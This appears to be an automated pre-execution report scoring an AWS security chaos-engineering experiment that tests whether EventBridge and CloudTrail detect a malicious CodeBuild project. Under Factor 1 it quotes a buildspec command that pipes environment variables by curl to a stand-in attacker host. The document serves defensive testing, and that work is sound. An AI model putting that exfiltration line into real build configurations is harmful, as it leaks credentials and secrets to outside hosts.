# PRE-EXECUTION QUALITY EVALUATION REPORT

## Experiment Information
- **SCE Node**: 1.3 SCE Experiment
- **Probe Type**: Detective
- **Attack Nodes**: 1.2 Create Malicious CodeBuild Project
- **Evaluation Date**: 2024-01-15

## Factor 1: ACTION ↔ Attack Correspondence
**Score**: 100
**Justification**: The attack implementation in the Python code directly corresponds to ADT node **1.2 Create Malicious CodeBuild Project**. Specifically:

- **Same Tactic**: The attack uses `aws codebuild create-project` (the `codebuild.create_project()` API call) exactly as specified in the ADT node's command field.
- **Same Technique**: The ADT references TTP T1552.005 (Unsecured Credentials). The implementation creates a CodeBuild project with a buildspec that attempts to exfiltrate environment variables (`env | curl -X POST -d @- http://attacker.example.com/collect`) and includes suspicious plaintext environment variables (`EXFIL_TARGET`, `STOLEN_SECRET`), directly simulating credential/secret exfiltration.
- **Dependencies Satisfied**: The ADT specifies dependencies `iam:PassRole` and `codebuild:CreateProject`. The implementation provisions a CodeBuild service role via CloudFormation and passes it via `serviceRole=role_arn`, exercising both permissions.
- **High Implementation Quality**: The attack is well-structured with proper error handling, logging, resource tagging for traceability, and realistic simulation of a malicious project (exfiltration URL, stolen secrets in environment variables, NO_SOURCE with inline buildspec).

---

## Factor 2: Defense ↔ Defense Correspondence
**Score**: 100
**Justification**: The detective control implemented corresponds precisely to ADT node **1.4 CodeBuild Activity Monitoring**:

- **ADT Specification**: "CloudTrail logging, CloudWatch alerts" with "Real-time project creation monitoring" as the mechanism.
- **Implementation**: The experiment deploys:
  - An **EventBridge rule** that monitors CloudTrail for `codebuild:CreateProject` API calls — this is real-time project creation monitoring via CloudTrail.
  - A **CloudWatch Log Group** as the target for detected events — this serves as the alerting/evidence mechanism.
  - A **CloudWatch Logs Resource Policy** allowing EventBridge to write to the log group.
  - The EventPattern explicitly filters for `source: aws.codebuild`, `detail-type: AWS API Call via CloudTrail`, and `eventName: CreateProject`.
- **High-Quality Code**: The CloudFormation template is well-structured with proper dependencies (`DependsOn`), resource policies, and outputs. The infrastructure is deployed with appropriate IAM scoping, resource tagging, and cleanup mechanisms. The stack includes timeout handling and failure recovery logic.

---

## Factor 3: PROBE ↔ Defensive Intent Correspondence
**Score**: 100
**Justification**: The detective probe in the ADT (node 1.3) asks: *"Will logging capture suspicious project setup?"* The `hypothesis_verification()` function directly validates this defensive intent:

- **Primary Verification**: The probe queries the CloudWatch Log Group for evidence that the EventBridge rule captured the `CreateProject` CloudTrail event, checking specifically for the malicious project name.
- **Multi-layered Detection**: The verification implements a robust detection pipeline:
  1. Verifies the EventBridge rule is ENABLED
  2. Polls CloudWatch Logs for `CreateProject` events with configurable timeout (360s, accounting for CloudTrail propagation delay)
  3. Parses event JSON to extract and verify event details (eventName, project name, eventSource, userIdentity)
  4. Falls back to `filter_log_events` API for pattern-based search
  5. Falls back to EventBridge metrics (`Invocations`, `TriggeredRules`) as secondary evidence
- **Accurate Hypothesis**: The steady-state hypothesis in the manifest states "Malicious CodeBuild project creation is detected by EventBridge rule via CloudTrail" — the probe returns `True` only when detection evidence is confirmed, and `False` when it is not, properly validating the detective control's effectiveness.
- The probe correctly distinguishes between detection of the specific malicious project vs. any `CreateProject` event, providing precise validation.

---

## FINAL SCORE CALCULATION

**Q_pre = 0.40 × 100 + 0.30 × 100 + 0.30 × 100**
Q_pre = 100.00

**Threshold**: 80
**Result**: Q_pre >= 80

## DECISION

**AUTHORIZE EXECUTION**

---

## Recommendations

The experiment is of high quality and ready for execution. Minor observations for potential enhancement (not blocking):

1. **CloudTrail Dependency**: The experiment assumes CloudTrail is already enabled in the account (EventBridge reads management events from CloudTrail by default). Consider adding a pre-flight check to verify CloudTrail is active.
2. **Propagation Delay**: The 360-second timeout is reasonable but CloudTrail events can occasionally take up to 15 minutes. The experiment correctly acknowledges this in logging but could optionally extend the timeout for production environments.
3. **Module Path**: The manifest references `chaosaws.ec2.1_3_sce_experiment_detective` — the `ec2` sub-module is slightly misleading for a CodeBuild experiment. Consider using a more descriptive module path like `chaosaws.codebuild.1_3_sce_experiment_detective`.